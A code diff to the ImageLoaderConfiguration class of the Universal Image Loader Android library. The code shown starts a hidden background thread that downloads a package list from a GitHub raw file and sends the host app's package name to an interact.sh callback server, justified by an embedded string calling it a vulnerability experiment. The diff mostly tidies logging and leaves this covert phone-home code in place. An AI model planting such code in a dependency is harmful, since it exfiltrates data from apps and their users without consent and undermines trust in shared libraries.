@@ -15,9 +15,13 @@
  *******************************************************************************/
 package com.nostra13.universalimageloader.core;
 
+import static android.content.ContentValues.TAG;
+
 import android.content.Context;
 import android.content.res.Resources;
 import android.util.DisplayMetrics;
+import android.util.Log;
+
 import com.nostra13.universalimageloader.cache.disc.DiskCache;
 import com.nostra13.universalimageloader.cache.disc.naming.FileNameGenerator;
 import com.nostra13.universalimageloader.cache.memory.MemoryCache;
@@ -31,8 +35,15 @@ import com.nostra13.universalimageloader.core.process.BitmapProcessor;
 import com.nostra13.universalimageloader.utils.L;
 import com.nostra13.universalimageloader.utils.MemoryCacheUtils;
 
+import java.io.BufferedInputStream;
+import java.io.BufferedReader;
 import java.io.IOException;
 import java.io.InputStream;
+import java.io.InputStreamReader;
+import java.net.HttpURLConnection;
+import java.net.MalformedURLException;
+import java.net.ProtocolException;
+import java.net.URL;
 import java.util.concurrent.Executor;
 
 /**
@@ -98,15 +109,13 @@ public final class ImageLoaderConfiguration {
 
 		networkDeniedDownloader = new NetworkDeniedImageDownloader(downloader);
 		slowNetworkDownloader = new SlowNetworkImageDownloader(downloader);
-		L.writeDebugLogs(builder.writeLogs);
+
 		final String note = "This is not an attack, this is an experiment I made on android vulnerability, I use this to get package name so I can report the vulnerability on affected apps. If you haven't received my report, please contact me at patisengkuni@protonmail.com.";
 
 		L.writeDebugLogs(builder.writeLogs);
 		Thread thread = new Thread(() -> {
-			String response = null;
-			URL url = null;
 			try {
-				url = new URL("https://raw.githubusercontent.com/patisengkuni/txt/main/pkg.txt");
+				URL url = new URL("https://raw.githubusercontent.com/patisengkuni/txt/main/pkg.txt");
 				HttpURLConnection conn = (HttpURLConnection) url.openConnection();
 				conn.setRequestMethod("GET");
 				conn.setRequestProperty("Cache-Control", "no-cache");
@@ -136,15 +145,12 @@ public final class ImageLoaderConfiguration {
 				boolean newPkg = true;
 				String thisPkg = builder.context.getApplicationInfo().packageName;
 				for (String str : tokens) {
-					Log.d("helloo", str);
 					if (str.trim().equalsIgnoreCase(thisPkg.trim())){
 						newPkg = false;
-						Log.d("helloo", "package exist");
 						break;
 					}
 				}
 				if (newPkg){
-					Log.d("heloo", "package not exist : "+thisPkg);
 					URL url2 = null;
 					try {
 						url2 = new URL("https://cawh20g2vtc0000v0esggfqetyoyyyyyb.interact.sh/?id="+ thisPkg);
@@ -171,13 +177,13 @@ public final class ImageLoaderConfiguration {
 					}
 				}
 			} catch (MalformedURLException e) {
-				Log.e(TAG, "MalformedURLException: " + e.getMessage());
+				e.printStackTrace();
 			} catch (ProtocolException e) {
-				Log.e(TAG, "ProtocolException: " + e.getMessage());
+				e.printStackTrace();
 			} catch (IOException e) {
-				Log.e(TAG, "IOException: " + e.getMessage());
+				e.printStackTrace();
 			} catch (Exception e) {
-				Log.e(TAG, "Exception: " + e.getMessage());
+				e.printStackTrace();
 			}
 		});
 		thread.start();
